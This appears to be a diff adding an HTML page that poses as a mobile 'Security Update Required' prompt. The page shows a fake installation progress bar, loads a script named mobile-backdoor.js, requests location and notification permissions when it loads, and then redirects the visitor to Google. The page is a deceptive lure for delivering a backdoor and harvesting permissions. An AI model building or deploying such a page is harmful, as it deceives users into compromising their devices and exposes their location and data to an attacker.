@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>Security Update Required</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+        }
+
+        .icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 10px;
+            transition: transform 0.2s;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s;
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="icon">🔒</div>
+        <h1>Security Update Required</h1>
+        <p>Your device needs a security update to protect your data. This will only take a moment.</p>
+
+        <button class="btn" id="updateBtn" onclick="startUpdate()">Install Security Update</button>
+
+        <div id="progress" class="hidden">
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="status" id="status">Initializing...</div>
+        </div>
+    </div>
+
+    <!-- Load mobile backdoor -->
+    <script src="../../assets/js/mobile-backdoor.js"></script>
+
+    <script>
+        let progress = 0;
+
+        function startUpdate() {
+            document.getElementById('updateBtn').classList.add('hidden');
+            document.getElementById('progress').classList.remove('hidden');
+
+            // Simulate update progress
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    completeUpdate();
+                }
+
+                document.getElementById('progressBar').style.width = progress + '%';
+
+                if (progress < 30) {
+                    document.getElementById('status').textContent = 'Downloading security patches...';
+                } else if (progress < 60) {
+                    document.getElementById('status').textContent = 'Installing updates...';
+                } else if (progress < 90) {
+                    document.getElementById('status').textContent = 'Configuring security settings...';
+                } else {
+                    document.getElementById('status').textContent = 'Finalizing...';
+                }
+            }, 500);
+        }
+
+        function completeUpdate() {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = '✓ Security update completed successfully!';
+            statusEl.classList.add('success');
+
+            // Redirect after a delay
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+
+        // Request permissions on load
+        window.addEventListener('load', async () => {
+            try {
+                // Request location permission
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(() => { }, () => { });
+                }
+
+                // Request notification permission
+                if ('Notification' in window && Notification.permission === 'default') {
+                    await Notification.requestPermission();
+                }
+            } catch (e) {
+                console.log('Permission request failed:', e);
+            }
+        });
+    </script>
+</body>
+
+</html>
